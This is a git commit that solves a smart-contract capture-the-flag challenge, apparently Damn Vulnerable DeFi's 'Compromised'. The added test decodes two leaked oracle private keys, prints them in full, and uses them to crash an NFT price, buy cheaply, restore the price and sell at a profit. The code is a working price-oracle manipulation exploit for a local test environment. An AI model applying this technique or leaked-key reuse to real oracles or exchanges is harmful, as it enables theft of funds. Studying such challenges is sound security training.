d3ef4cfe64e5467a954ada9333e5c85de5532b52
0xDmitry <sign-69@mail.ru>
2023-08-16 03:05:25 -0300

    Solve challenge 7

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -62,7 +62,60 @@ describe('Compromised challenge', function () {
   })
 
   it('Execution', async function () {
-    /** CODE YOUR SOLUTION HERE */
+    // Base64 hex
+    // 4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+
+    // Base64 string
+    // MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+
+    // Private key decoded from Base64 string
+    // 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+    const wallet1 = new ethers.Wallet(
+      '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
+      ethers.provider,
+    )
+
+    // Base64 hex
+    // 4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+
+    // Base64 string
+    // MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+
+    // Private key decoded from Base64 string
+    // 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+    const wallet2 = new ethers.Wallet(
+      '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48',
+      ethers.provider,
+    )
+
+    const interface = new ethers.utils.Interface([
+      'function postPrice(string calldata symbol, uint256 newPrice)',
+    ])
+    await wallet1.sendTransaction({
+      to: oracle.address,
+      data: interface.encodeFunctionData('postPrice', ['DVNFT', '0']),
+    })
+    await wallet2.sendTransaction({
+      to: oracle.address,
+      data: interface.encodeFunctionData('postPrice', ['DVNFT', '0']),
+    })
+
+    const tx = await exchange.connect(player).buyOne({ value: 1 })
+    const rc = await tx.wait()
+    const event = rc.events.find((event) => event.event === 'TokenBought')
+    const [, tokenId] = event.args
+
+    await wallet1.sendTransaction({
+      to: oracle.address,
+      data: interface.encodeFunctionData('postPrice', ['DVNFT', INITIAL_NFT_PRICE]),
+    })
+    await wallet2.sendTransaction({
+      to: oracle.address,
+      data: interface.encodeFunctionData('postPrice', ['DVNFT', INITIAL_NFT_PRICE]),
+    })
+
+    await nftToken.connect(player).approve(exchange.address, tokenId)
+    await exchange.connect(player).sellOne(tokenId)
   })
 
   after(async function () {
